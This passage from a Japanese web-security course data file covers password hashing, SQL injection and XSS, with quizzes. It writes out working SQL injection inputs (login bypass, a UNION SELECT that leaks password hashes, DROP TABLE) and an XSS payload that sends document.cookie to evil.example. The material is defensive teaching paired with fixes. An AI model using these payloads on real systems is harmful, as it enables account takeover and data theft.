**「ブラウザでチェックしているから大丈夫」は成り立たない** ことです。ブラウザのチェックは使いやすさのため、**守るためのチェックはサーバーで** します。\n\n## 守るべき 3 つのもの\n\n| | 意味 | 破られた例 |\n|---|---|---|\n| **機密性** | 見てよい人だけが見られる | 他人の住所が見える、パスワードが漏れる |\n| **完全性** | 正しい人が、正しいやり方でしか変えられない | 他人の投稿を消せる、値段を書き換えて買える |\n| **可用性** | 使いたいときに使える | 大量のリクエストでサーバーが落ちる、データが全部消える |\n\n英語の頭文字で **CIA**（Confidentiality・Integrity・Availability）と呼ばれます。AI のコードを見るときは、「この部分が破られたら、3 つのどれが壊れる？」と考えると、重要度の判断ができます。\n\n## 考え方 1：最小権限\n\n**必要な分だけの権限しか渡さない** という考え方です。\n\n| 場面 | 大きすぎる権限 | 最小権限 |\n|---|---|---|\n| GitHub のトークン | すべてのリポジトリに書き込める | 1 つのリポジトリの、必要な操作だけ |\n| データベースのユーザー | 管理者（テーブルを消せる） | 読み書きだけ |\n| OAuth のスコープ | メールも予定表も全部読める | プロフィールだけ（バックエンドコースのレッスン 18） |\n| AI のエージェント | 何でも実行してよい | 決めたフォルダの中だけ、危ないコマンドは確認 |\n\n権限が小さければ、**もし漏れたり乗っ取られたりしても、被害が小さく済みます**。\n\n## 考え方 2：多層防御\n\n1 つの対策に頼らず、**何枚も守りを重ねる** 考え方です。どれか 1 枚が破られても、次で止められます。\n\n```text\nブラウザの入力チェック → サーバーのバリデーション → プレースホルダ（SQL）→ データベースの制約 → ログと監視\n```\n\nデータベース設計のコースで、「アプリでチェックしていても、データベースにも制約を付ける」と学んだのも、この考え方です。\n\n## 考え方 3：秘密は「隠し場所」ではなく「鍵」で守る\n\n「URL を知っている人しか見られないから安全」「分かりにくい名前のフォルダに置いたから安全」は、**隠しているだけ** で、守っていません。URL は履歴・共有・ログから漏れます。\n本当に守るなら、**ログインして権限を確かめる** 仕組みにします。\n\n## AI のコードではこう出てくる\n\nAI のコードを読むときは、次の順番で見ていきます。このコースのレッスンが、それぞれの詳しい説明です。\n\n| 順番 | 見ること | レッスン |\n|---|---|---|\n| ① | 外から来るデータはどこから入る？（`request.`、`input()`、`req.body`、ファイル） | このレッスン |\n| ② | それは SQL・HTML・コマンド・ファイルパスに **そのまま** 使われていないか | 3・4 |\n| ③ | パスワード・トークン・秘密の扱いは正しいか | 2・5 |\n| ④ | 「誰が」「何を」してよいかを、サーバーで確かめているか | 5 |\n| ⑤ | 使っているライブラリは安全か | 6 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "ブラウザの JavaScript で「数量は 1〜10」とチェックしている。サーバー側のチェックは必要？",
        "choices": [
         "不要。ブラウザでチェックしているので、おかしな値は送られてこない",
         "必要。攻撃者はブラウザを使わずに、好きな値のリクエストを直接送れる",
         "必要だが、数量のような小さなことには不要"
        ],
        "answer": 1,
        "explain": "ブラウザのチェックは使いやすさのためのもので、飛ばせます。守るためのチェックは必ずサーバーで行います。"
       },
       {
        "question": "「最小権限」の例として正しいのは？",
        "choices": [
         "開発を楽にするため、トークンには全部の権限を付けておく",
         "リポジトリに保存するだけのトークンは、そのリポジトリの書き込み権限だけにする",
         "管理者のアカウントを全員で共有する"
        ],
        "answer": 1,
        "explain": "必要な分だけの権限にしておけば、漏れたときの被害が小さくなります。"
       },
       {
        "question": "「URL を知っている人しか見られないので、ログインは不要」という設計の問題は？",
        "choices": [
         "URL は履歴・共有・ログなどから漏れるので、隠しているだけで守れていない",
         "URL が長くなりすぎる",
         "問題はない"
        ],
        "answer": 0,
        "explain": "推測しにくい URL は補助にはなりますが、守りにはなりません。見てよい人かどうかを確かめる仕組みが必要です。"
       }
      ]
     ],
     "id": "01-mindset"
    },
    {
     "title": "パスワードとハッシュ ― なぜ「遅い」ハッシュを使うのか",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "security",
      "auth"
     ],
     "summary": "SHA-256 では 1 秒に 100 万回以上試せてしまう。ソルト・bcrypt・Argon2 の役割を実際に測って確かめ、トークンの作り方や比べ方の落とし穴まで。",
     "body": "## このレッスンのゴール\n\n- パスワードを SHA-256 や MD5 だけで保存してはいけない理由を、数字で説明できる\n- ソルトと「わざと遅いハッシュ」（bcrypt・Argon2）の役割が分かる\n- パスワードリセットのトークンなど、ランダムな値を安全に作る方法が分かる\n\nバックエンドコースのレッスン 9 で「bcrypt でハッシュ化する」ことを学びました。ここでは **なぜそれでなければいけないのか** を、実際に攻撃する側の立場で確かめます。\n\n## 前提：データベースは盗まれるかもしれない\n\nパスワードを守る仕組みは、「データベースの中身が盗まれた後」を想定しています。盗んだ人は、**手元のパソコンで好きなだけ試せます**。どれだけ時間を稼げるかが勝負です。\n\n## SHA-256 はなぜダメか\n\n```python\nimport hashlib\nhashlib.sha256(\"password\".encode()).hexdigest()\n# '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'\n```\n\nハッシュは元に戻せない変換なので、一見安全そうです。でも、問題が 2 つあります。\n\n### ① 同じパスワードは、いつも同じハッシュ\n\n`password` の SHA-256 は、誰が計算しても上と同じ値です。よく使われるパスワードのハッシュを並べた **早見表（レインボーテーブル）** がネットに出回っているので、**検索するだけで元のパスワードが分かります**。\nMD5（`5f4dcc3b5aa765d61d8327deb882cf99` が `password`）はさらに有名です。\n\n### ② 速すぎる\n\n```python\nfor i in range(1_000_000):\n    hashlib.sha256(str(i).encode()).digest()\n# この環境（普通の Python・1 コア）で 1 秒に約 130 万回\n```\n\nSHA-256 は **速く計算できるように作られた** ハッシュです。ファイルが壊れていないかの確認には便利ですが、パスワードにとっては、攻撃者が **速く総当たりできる** ということです。\n\n```python\ntarget = hashlib.sha256(b\"4821\").hexdigest()      # 4 桁の暗証番号のハッシュが盗まれた\nfor i in range(10000):\n    if hashlib.sha256(f\"{i:04d}\".encode()).hexdigest() == target:\n        print(\"found\", f\"{i:04d}\")                # found 4821 … 約 3 ミリ秒\n```\n\n専用の機械（GPU）を使えば、1 秒に **何十億回** も試せます。8 文字の英小文字（約 2000 億通り）なら数分です。\n\n## 対策 1：ソルト\n\n**ユーザーごとに違うランダムな値（ソルト）を混ぜてから** ハッシュにします。\n\n```text\npassword + 「x7Kp...」→ ハッシュ A\npassword + 「Qm2v...」→ ハッシュ B   ← 同じパスワードでも違う値\n```\n\n- 早見表が使えなくなる（ソルトごとに作り直しになる）\n- 同じパスワードの人がいても、データベースを見ただけでは分からない\n\n## 対策 2：わざと遅いハッシュ\n\n```python\nimport bcrypt, time\n\nstart = time.perf_counter()\nhashed = bcrypt.hashpw(\"hana-2027\".encode(), bcrypt.gensalt())     # 初期設定のコスト 12\nprint(time.perf_counter() - start)       # 約 0.32 秒\n\nbcrypt.hashpw(b\"password\", bcrypt.gensalt())\n# b'$2b$12$5FSqAz1NnR26p6ckisKaEOVHfi4M4HUoozeb2Gei7cAuYAP8mKI9O'\nbcrypt.hashpw(b\"password\", bcrypt.gensalt())\n# b'$2b$12$eFQcohm2C.k24vmpTx4r5.xXUtRuWEgxmQpc30YW1VAXNWTlXvNC6'   ← 同じパスワードでも毎回違う\n```\n\n| | SHA-256 | bcrypt（コスト 12） |\n|---|---|---|\n| 1 回の計算 | 約 0.0000008 秒 | 約 0.32 秒 |\n| 1 秒に試せる数（この環境） | 約 130 万回 | 約 3 回 |\n\n**約 40 万倍遅い** ので、総当たりにかかる時間も 40 万倍になります。ログインする本人にとっては 0.3 秒の待ち時間ですが、何億回も試したい攻撃者にとっては致命的です。\n\nbcrypt の結果の文字列には、必要なものが全部入っています。\n\n```text\n$2b$12$5FSqAz1NnR26p6ckisKaEO VHfi4M4HUoozeb2Gei7cAuYAP8mKI9O\n │   │  └ ソルト（22 文字）     └ ハッシュ本体\n │   └ コスト（2 の 12 乗回くり返す。1 増やすと 2 倍遅くなる）\n └ 方式（bcrypt）\n```\n\nだから、ソルトを別の列に保存する必要はありません。`bcrypt.checkpw(入力, 保存した値)` が、中のソルトとコストを使って同じ計算をして比べてくれます。\n\n### Argon2：今のおすすめ\n\n```python\nfrom argon2 import PasswordHasher\nph = PasswordHasher()\nh = ph.hash(\"hana-2027\")\n# '$argon2id$v=19$m=65536,t=3,p=4$...'   m=65536 は 64MB のメモリを使う、という意味\nph.verify(h, \"hana-2027\")      # True\nph.verify(h, \"wrong\")          # VerifyMismatchError（例外）\n```\n\nArgon2 は **計算時間に加えて、メモリもたくさん使う** ので、GPU でまとめて試すのがさらに難しくなります。新しく作るなら Argon2（argon2id）、既存のものは bcrypt でも十分です。\n\n⚠️ bcrypt は **72 バイトまで** しか見ません。この環境の bcrypt 5 では、72 バイトを超えるパスワードを渡すと `ValueError: password cannot be longer than 72 bytes` になりました（古い版は黙って切り捨てます）。日本語は 1 文字 3 バイトなので、24 文字で上限です。\n\n## ランダムな値は `secrets` で作る\n\nパスワードリセットの URL、メール確認のコード、API キーなどは、**推測されない** ことがすべてです。\n\n```python\nimport random\nrandom.seed(42); [random.randint(0, 9) for _ in range(6)]   # [1, 0, 4, 3, 3, 2]\nrandom.seed(42); [random.randint(0, 9) for _ in range(6)]   # [1, 0, 4, 3, 3, 2]   ← 同じ並び\n\nimport secrets\nsecrets.token_urlsafe(32)        # 'q3J0...'（毎回違う、推測できない 43 文字）\nf\"{secrets.randbelow(1_000_000):06d}\"   # 6 桁の確認コード\n```\n\n`random` は、**種（シード）が分かれば次の値が予想できる** 作りです（ゲームやシミュレーション用）。セキュリティに関わる値は、必ず `secrets` を使います。JavaScript では `crypto.randomUUID()` や `crypto.getRandomValues()` を使い、`Math.random()` は使いません。\n\n## 比べ方にも注意\n\n```python\nif token == saved_token:                       # ⚠️ 先頭から 1 文字ずつ比べ、違った時点で終わる\nimport hmac\nif hmac.compare_digest(token, saved_token):    # ✅ いつも同じ時間で比べる\n```\n\n`==` は、違う文字が見つかった時点で終わるので、**何文字目まで合っていたかが、かかった時間からわずかに分かる** ことがあります（タイミング攻撃）。トークンや署名を比べるときは `hmac.compare_digest` を使います。bcrypt・Argon2 の確認関数は、中でこれを使っています。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `hashlib.md5(password...)` / `hashlib.sha256(password...)` | ⚠️ パスワードには使わない。bcrypt か Argon2 に |\n| `bcrypt.hashpw(...)` / `PasswordHasher().hash(...)` / `passlib` / `pwdlib` | ✅ |\n| パスワードを暗号化（`Fernet` など）して保存し、復号して比べる | ⚠️ 鍵が漏れたら全員分が戻せる。ハッシュにする |\n| `random.choice(...)` でトークン・パスワードを作る | ⚠️ `secrets` に |\n| `token == request.args[\"token\"]` | ⚠️ `hmac.compare_digest` に |\n| パスワードを `print` やログに出している | ⚠️ ログから漏れる |\n| 「パスワードを忘れた」で今のパスワードをメールで送る | ⚠️ 元に戻せるということは、ハッシュにしていない |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "パスワードを SHA-256 だけでハッシュにして保存するのが危ない理由として、正しいものは？",
        "choices": [
         "SHA-256 は元に戻せるから",
         "計算が速いので、盗まれたときに総当たりで大量に試されてしまうから",
         "SHA-256 は長すぎて保存できないから"
        ],
        "answer": 1,
        "explain": "SHA-256 は戻せませんが、速すぎます。この環境でも 1 秒に約 130 万回試せました。bcrypt なら約 3 回です。"
       },
       {
        "question": "bcrypt で同じパスワードを 2 回ハッシュにすると、結果が毎回違う理由は？",
        "choices": [
         "bcrypt が壊れているから",
         "ハッシュにするたびに、違うソルト（ランダムな値）を混ぜているから",
         "時刻を混ぜているから"
        ],
        "answer": 1,
        "explain": "ソルトのおかげで、早見表が使えず、同じパスワードの人がいても分かりません。ソルトは結果の文字列の中に入っているので、確認もできます。"
       },
       {
        "question": "パスワードリセット用の URL に入れるトークンを作る方法として適切なのは？",
        "choices": [
         "`random.randint(100000, 999999)`",
         "ユーザー ID と日時をつなげた文字列",
         "`secrets.token_urlsafe(32)`"
        ],
        "answer": 2,
        "explain": "`random` はシードが分かると予想できます。ID と日時も推測できます。`secrets` は推測できない値を作るためのモジュールです。"
       }
      ]
     ],
     "id": "02-passwords"
    },
    {
     "title": "SQL インジェクション ― 入力が命令に変わる",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "security",
      "database",
      "strings"
     ],
     "summary": "f 文字列で組み立てた SQL に細工した入力を入れると、ログインの突破やパスワードの盗み出しができてしまう。実際に再現し、プレースホルダで防ぐ。列名・並べ替えなど「? が使えない場所」の守り方も。",
     "body": "## このレッスンのゴール\n\n- SQL インジェクションが起きる仕組みを、実際の SQL 文で説明できる\n- プレースホルダ（`?`）でなぜ防げるのかが分かる\n- テーブル名・列名・`ORDER BY` など、プレースホルダが使えない場所の守り方が分かる\n\n## 何が起きるのか\n\n```python\ndef find_user(name):\n    sql = f\"SELECT id, name FROM users WHERE name = '{name}'\"   # ⚠️ 入力を文字列に埋め込む\n    return conn.execute(sql).fetchall()\n```\n\n普通の入力なら、問題なく動きます。\n\n```text\n入力：ryo\nSQL ：SELECT id, name FROM users WHERE name = 'ryo'\n結果：[(2, 'ryo')]\n```\n\nでは、名前の欄に `' OR '1'='1` と入れると？\n\n```text\n入力：' OR '1'='1\nSQL ：SELECT id, name FROM users WHERE name = '' OR '1'='1'\n結果：[(1, 'admin'), (2, 'ryo')]     ← 全員が出てきた\n```\n\n入力の最初の `'` が、SQL の文字列を **途中で閉じて** しまいました。その後ろの `OR '1'='1'` は、もう「名前」ではなく **SQL の命令の一部** です。`'1'='1'` はいつも正しいので、全員の行が条件に合います。\nログインの処理でこれが起きると、**パスワードを知らなくても、最初のユーザー（多くは管理者）としてログインできてしまいます**。\n\n（このレッスンの例は、すべて SQLite の中で実際に再現したものです）\n\n## 別のテーブルを盗み出す\n\n商品の検索にも同じ穴があるとします。\n\n```python\ndef search(q):\n    sql = f\"SELECT name, price FROM products WHERE name LIKE '%{q}%'\"\n    return conn.execute(sql).fetchall()\n```\n\n```text\n入力：' UNION SELECT name, password_hash FROM users --\nSQL ：SELECT name, price FROM products WHERE name LIKE '%' UNION SELECT name, password_hash FROM users --%'\n結果：[('admin', '$2b$12$xxx'), ('ryo', '$2b$12$yyy'), ('りんご', 120), ('牛乳', 200)]\n```\n\n| 入力の部分 | 役割 |\n|---|---|\n| `'` | 文字列を閉じる |\n| `UNION SELECT name, password_hash FROM users` | **別の SELECT の結果をくっつける**（列の数を 2 つにそろえている） |\n| `--` | SQL のコメント。後ろに残った `%'` を無視させる |\n\n**商品検索の画面に、ユーザーのパスワードのハッシュが表示されました**。前のレッスンで「データベースは盗まれるかもしれない」と考えたのは、こういうことが起きるからです。\n\n`'; DROP TABLE products; --` のように、命令を 2 つにしてテーブルを消す攻撃も有名です。Python の `sqlite3` の `execute` は、1 回に 1 つの命令しか実行しないので、この形は `You can only execute one statement at a time.` で止まりました。ただし、**他のデータベースやライブラリでは通ることがある** ので、安心材料にはなりません。\n\n## 防ぎ方：プレースホルダ\n\n```python\nconn.execute(\"SELECT id, name FROM users WHERE name = ?\", (name,))\n```\n\n```text\n入力：' OR '1'='1\n結果：[]     ← 「' OR '1'='1 という名前の人」を探したので、0 件\n```\n\n```python\nconn.execute(\"SELECT name, price FROM products WHERE name LIKE ?\", (f\"%{q}%\",))\n# UNION の入力でも：[]\n```\n\nプレースホルダ（`?`）を使うと、**SQL の形（命令）と、値（データ）が別々にデータベースへ渡されます**。データベースは先に SQL の形を決めてから値をはめ込むので、値の中に `'` や `UNION` があっても、**ただの文字として扱われ、命令にはなりません**。\n\n| データベース／ライブラリ | プレースホルダの書き方 |\n|---|---|\n| Python の sqlite3 | `?` |\n| psycopg（PostgreSQL） | `%s`（⚠️ 文字列の `%` 演算子とは別物） |\n| Node.js の better-sqlite3・D1 | `?` ＋ `.bind()` / `.run(値)` |\n| node-postgres | `$1`, `$2` |\n| SQLAlchemy の `text()` | `:name` ＋ `{\"name\": 値}` |\n\n⚠️ psycopg の `%s` は、`cur.execute(\"... WHERE name = %s\", (name,))` のように **第 2 引数で** 渡します。`\"... = %s\" % name` と `%` 演算子でつなぐと、f 文字列と同じく危険です。\n\n## プレースホルダが使えない場所\n\nプレースホルダで渡せるのは **値** だけです。テーブル名・列名・`ASC`/`DESC` のような **SQL の言葉そのもの** は渡せません。\n\n```python\nconn.execute(\"SELECT * FROM ?\", (\"users\",))\n# sqlite3.OperationalError: near \"?\": syntax error\n\nconn.execute(\"SELECT name FROM products ORDER BY ?\", (\"price DESC\",)).fetchall()\n# エラーにはならないが、「'price DESC' という固定の文字列」で並べたことになり、並べ替えが効かない\n```\n\n並べ替えの列を利用者に選ばせたいときは、**許可した値の一覧（許可リスト）** と照らし合わせます。\n\n```python\nSORTABLE = {\"name\": \"name\", \"price\": \"price\", \"new\": \"created_at\"}\n\ndef list_products(sort, desc):\n    column = SORTABLE.get(sort, \"name\")          # 一覧に無ければ name\n    direction = \"DESC\" if desc else \"ASC\"        # 2 択に固定\n    sql = f\"SELECT name, price FROM products ORDER BY {column} {direction}\"\n    return conn.execute(sql).fetchall()\n```\n\nf 文字列を使っていますが、入るのは **自分で書いた一覧の中の文字列だけ** なので安全です。**利用者の入力そのものを SQL に入れない** ことがポイントです。\n\n## ORM を使っていても\n\n```python\nsession.execute(text(f\"SELECT * FROM users WHERE name = '{name}'\"))    # ⚠️ ORM でも同じ穴\nsession.execute(text(\"SELECT * FROM users WHERE name = :name\"), {\"name\": name})   # ✅\nUser.objects.raw(f\"SELECT ... WHERE name = '{name}'\")                   # ⚠️ Django でも\n```\n\nORM の普通の書き方（`select(User).where(User.name == name)`）は自動でプレースホルダになりますが、**生の SQL を書く機能** では、自分で守る必要があります。\n\n## 他の「インジェクション」\n\n「外から来た文字列を、別の言語の命令に混ぜる」と、同じ種類の問題が起きます。\n\n| 混ぜる先 | 危ない書き方 | 安全な書き方 |\n|---|---|---|\n| SQL | `f\"... WHERE name = '{name}'\"` | プレースホルダ |\n| HTML | `el.innerHTML = name` | 次のレッスン（XSS） |\n| シェルのコマンド | `os.system(f\"convert {filename} out.png\")` | `subprocess.run([\"convert\", filename, \"out.png\"])`（リストで渡す） |\n| ファイルのパス | `open(f\"uploads/{filename}\")` | `../../.env` のような名前を拒否する（`Path(...).resolve()` が uploads の中か確かめる） |\n| LLM へのプロンプト | 利用者の文章をそのまま指示に混ぜる | 指示とデータを分け、LLM の出力を信用しすぎない |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `execute(f\"...{x}...\")` / `execute(\"...\" + x)` / `execute(\"... %s\" % x)` | ⚠️ SQL インジェクション |\n| `execute(\"... = ?\", (x,))` / `execute(\"... = %s\", (x,))` | ✅ |\n| `` db.prepare(`... ${x}`) ``（JavaScript のテンプレート文字列） | ⚠️ 同じ穴 |\n| `ORDER BY {sort}` に `request.args[\"sort\"]` をそのまま | ⚠️ 許可リストに |\n| `os.system(f\"...\")` / `subprocess.run(..., shell=True)` に外からの値 | ⚠️ コマンドインジェクション |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`f\"SELECT * FROM users WHERE name = '{name}'\"` に `' OR '1'='1` を入れると、なぜ全員が出てくる？",
        "choices": [
         "データベースのバグだから",
         "入力の `'` で文字列が閉じられ、`OR '1'='1'` が SQL の条件として実行されるから",
         "`OR` という名前のユーザーがいるから"
        ],
        "answer": 1,
        "explain": "入力が「値」ではなく「命令の一部」になってしまうのが SQL インジェクションです。`'1'='1'` はいつも正しいので、全行が条件に合います。"
       },
       {
        "question": "プレースホルダ（`?`）を使うと防げる理由は？",
        "choices": [
         "入力から `'` を自動で削除するから",
         "SQL の形と値を別々に渡すので、値の中身が命令として解釈されないから",
         "入力の長さを制限するから"
        ],
        "answer": 1,
        "explain": "データベースは SQL の形を先に決めてから値をはめ込みます。値に `'` や `UNION` が含まれていても、ただの文字として扱われます。"
       },
       {
        "question": "利用者が並べ替えの列（`name`・`price`）を選べるようにしたい。安全な方法は？",
        "choices": [
         "`ORDER BY ?` にして、選んだ列名を渡す",
         "入力から `'` を取り除いてから f 文字列で埋め込む",
         "許可した列名の一覧と照らし合わせ、一覧の中の文字列だけを SQL に入れる"
        ],
        "answer": 2,
        "explain": "列名はプレースホルダで渡せません（渡しても並べ替えが効きません）。利用者の入力そのものではなく、自分で用意した一覧の値を使います。"
       }
      ]
     ],
     "id": "03-sql-injection"
    },
    {
     "title": "XSS ― 他人のブラウザで勝手にプログラムが動く",
     "level": 2,
     "minutes": 20,
     "concepts": [
      "security",
      "dom_ui",
      "strings"
     ],
     "summary": "入力に仕込んだ HTML がそのまま表示されると、見た人のブラウザでプログラムが動く。innerHTML と textContent の違いを実際のブラウザで確かめ、エスケープ・サニタイズ・CSP で防ぐ。このサイト自身の守り方も読む。",
     "body": "## このレッスンのゴール\n\n- XSS（クロスサイトスクリプティング）で何ができてしまうのかを説明できる\n- `innerHTML` と `textContent` の違い、エスケープとサニタイズの違いが分かる\n- テンプレート（Jinja2・React）が自動で守ってくれる範囲と、守ってくれない書き方が分かる\n\n## 何が起きるのか\n\n掲示板に、こんな「名前」で投稿されたとします。\n\n```html\n<img src=x onerror=\"fetch('https://evil.example/steal?c=' + document.cookie)\">\n```\n\nこれをそのまま HTML として表示すると、\n\n1. ブラウザは `<img>` を画像だと思って `x` を読み込もうとする\n2. `x` という画像は無いので、読み込みに失敗する\n3. 失敗したときに実行する `onerror` の中身（JavaScript）が動く\n4. **その掲示板を見た人全員** のブラウザで、Cookie などが攻撃者に送られる\n\n攻撃者のプログラムが、**被害者のブラウザの中で、そのサイトの一員として動く** のが XSS です。\n\n| XSS でできてしまうこと | |\n|---|---|\n| ログイン状態（Cookie・localStorage のトークン）を盗む | 被害者になりすませる |\n| 被害者として操作する | 投稿・送金・パスワード変更 |\n| 画面を書き換える | 偽のログイン画面を出してパスワードを入力させる |\n\n## innerHTML と textContent\n\n実際のブラウザ（Chromium）で、同じ文字列を 2 通りに表示してみました。\n\n```javascript\nconst evil = '<img src=x onerror=\"window.hacked.push(\\'innerHTML\\')\">こんにちは';\n\ndocument.getElementById(\"a\").innerHTML = evil;      // HTML として解釈する\ndocument.getElementById(\"b\").textContent = evil;    // ただの文字として表示する\n```\n\n```text\nwindow.hacked → [\"innerHTML\"]                    ← innerHTML の方だけ、onerror が実行された\nb の中身      → &lt;img src=x onerror=...&gt;こんにちは   ← 文字のまま表示された（実行されない）\n```\n\n| | `innerHTML` | `textContent` |\n|---|---|---|\n| `<b>太字</b>` | **太字** になる | `<b>太字</b>` という文字が見える |\n| 外からの文字列に使うと | ⚠️ XSS | ✅ 安全 |\n\n**外から来た文字列を表示するときは `textContent`** が基本です。\n\nちなみに、`innerHTML` で `<script>...</script>` を入れても実行されません（ブラウザの決まり）。でも、上のように `onerror` などを使えば実行できるので、「`<script>` を消せば安全」は間違いです。\n\n## エスケープ：HTML の記号を文字に変える\n\nHTML の中に文字列を埋め込むときは、意味を持つ記号を **別の書き方（文字参照）に置き換え** ます。これを **エスケープ** と呼びます。\n\n| 記号 | 置き換え後 |\n|---|---|\n| `<` | `&lt;` |\n| `>` | `&gt;` |\n| `&` | `&amp;` |\n| `\"` | `&quot;` |\n| `'` | `&#39;` |\n\n```python\nimport html\nhtml.escape('<a href=\"x\">&</a>')\n# '&lt;a href=&quot;x&quot;&gt;&amp;&lt;/a&gt;'\n```\n\n### このサイトの守り方\n\nこのサイトの `site/app.js` にも、同じ仕組みがあります。\n\n```javascript\nconst esc = (s) =>\n  String(s ?? \"\").replace(/[&<>\"']/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" }[c]));\n```\n\n5 つの記号を、正規表現で見つけて置き換えています。画面を組み立てるときに `${esc(c.title)}` のように、**文字列を HTML に入れる前に必ず通している** のが読み取れます。\n\n## テンプレートは自動でエスケープしてくれる\n\n```python\nfrom jinja2 import Environment\nt = \"<p>こんにちは、{{ name }} さん</p>\"\n\nEnvironment(autoescape=True).from_string(t).render(name=\"<script>alert(1)</script>\")\n# '<p>こんにちは、&lt;script&gt;alert(1)&lt;/script&gt; さん</p>'   ← 安全\n\nEnvironment(autoescape=False).from_string(t).render(name=\"<script>alert(1)</script>\")\n# '<p>こんにちは、<script>alert(1)</script> さん</p>'                ← 危ない\n```\n\nFlask・Django のテンプレート、React の `{name}`、Vue の `{{ name }}` は、**初期設定で自動エスケープ** してくれます。危ないのは、それを **わざと外す書き方** です。\n\n| フレームワーク | 自動エスケープを外す書き方（⚠️） |\n|---|---|\n| Jinja2（Flask） | `{{ bio \\| safe }}`、`Markup(...)`、`autoescape=False` |\n| Django | `{{ bio \\| safe }}`、`mark_safe(...)` |\n| React | `dangerouslySetInnerHTML={{ __html: bio }}` |\n| Vue | `v-html=\"bio\"` |\n| 素の JavaScript | `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write` |\n\n```python\nEnvironment(autoescape=True).from_string(\"<p>{{ bio | safe }}</p>\").render(bio=\"<img src=x onerror=alert(1)>\")\n# '<p><img src=x onerror=alert(1)></p>'      ← | safe で守りが外れた\n```\n\n## HTML を表示したいとき：サニタイズ\n\nブログの本文のように、**太字やリンクは使わせたいが、危ないものは消したい** ときは、**サニタイズ**（危ない部分だけを取り除く）をします。自分で書かず、専用のライブラリを使います。\n\n```javascript\nDOMPurify.sanitize('<img src=x onerror=\"...\">こんにちは')\n// '<img src=\"x\">こんにちは'     ← onerror だけが消えた（実際に確認）\n```\n\nこのサイトも、レッスンの Markdown を HTML にした後、必ず DOMPurify を通しています。\n\n```javascript\nconst md = (text) => DOMPurify.sanitize(marked.parse(text ?? \"\"));\n```\n\n| | エスケープ | サニタイズ |\n|---|---|---|\n| すること | 記号を全部文字に変える | 危ないタグ・属性だけを取り除く |\n| `<b>太字</b>` | 文字として見える | 太字になる |\n| 使う場面 | 名前・コメントなど、HTML を使わせない場所（ほとんど） | Markdown・リッチテキストを表示する場所 |\n| Python | `html.escape`、テンプレートの自動エスケープ | `nh3`、`bleach` |\n| JavaScript | `textContent`、React の `{}` | DOMPurify |\n\n## もう一枚の守り：CSP\n\n**CSP（コンテンツセキュリティポリシー）** は、「このページでは、どこから来た JavaScript なら実行してよいか」をブラウザに伝える仕組みです。\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```\n\nこれがあると、ページの中に紛れ込んだ `onerror=\"...\"` のような書き方は実行されなくなります。エスケープの漏れがあっても止められる **多層防御**（レッスン 1）です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `el.innerHTML = 外からの値` / `` `<p>${name}</p>` `` を innerHTML へ | ⚠️ textContent にするか、エスケープ |\n| `el.textContent = name` | ✅ |\n| `dangerouslySetInnerHTML` / `v-html` / `\\| safe` / `mark_safe` | ⚠️ 中身がどこから来るか確認。外からならサニタイズ |\n| `marked(text)` の結果をそのまま innerHTML | ⚠️ Markdown にも HTML を書けるので、DOMPurify を通す |\n| `<a href=\"${url}\">` に外からの URL | ⚠️ `javascript:alert(1)` という URL も入れられる。`http:`・`https:` で始まるか確認 |\n| 自作の「`<script>` を消す」処理 | ⚠️ `onerror` などで抜けられる。ライブラリを使う |\n| ログインのトークンを localStorage に保存 | ⚠️ XSS が 1 つでもあれば盗まれる。HttpOnly の Cookie なら JavaScript から読めない |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "外から来た文字列 `name` を画面に表示するコードとして安全なのは？",
        "choices": [
         "`el.innerHTML = name`",
         "`el.textContent = name`",
         "`el.innerHTML = name.replace(\"<script>\", \"\")`"
        ],
        "answer": 1,
        "explain": "textContent は HTML として解釈せず、文字として表示します。`<script>` を消すだけでは、`<img onerror=...>` などで抜けられます。"
       },
       {
        "question": "React で `<p>{comment}</p>` と書いた場合と、`dangerouslySetInnerHTML={{ __html: comment }}` と書いた場合の違いは？",
        "choices": [
         "前者は自動でエスケープされて安全、後者は HTML として表示されるので外からの値には危険",
         "どちらも同じ",
         "前者が危険で、後者が安全"
        ],
        "answer": 0,
        "explain": "React の `{}` は自動エスケープしてくれます。名前のとおり「危険」な dangerouslySetInnerHTML は、サニタイズ済みの値にだけ使います。"
       },
       {
        "question": "ブログで「太字やリンクは使えるが、危ないものは消したい」ときの正しい方法は？",
        "choices": [
         "すべてエスケープする",
         "自分で正規表現を書いて `<script>` を消す",
         "DOMPurify などのサニタイズ用ライブラリを通してから表示する"
        ],
        "answer": 2,
        "explain": "エスケープすると太字も文字になってしまいます。危ない部分だけを取り除くのがサニタイズで、抜け道が多いので専用のライブラリを使います。"
       }
      ]
     ],
     "id": "04-xss"
    },
    {
     "title": "ログインとセッションの落とし穴",
     "level": 3,
     "minutes": 22,
     "concepts": [
      "security",
      "auth",
      "http_api"
     ],
     "summary": "署名を確かめない JWT、送られてきた is_admin をそのまま保存する、エラーメッセージで会員かどうかがばれる、総当たりし放題、CSRF。ログインの周りで AI が見落としやすい穴を、再現しながら。",
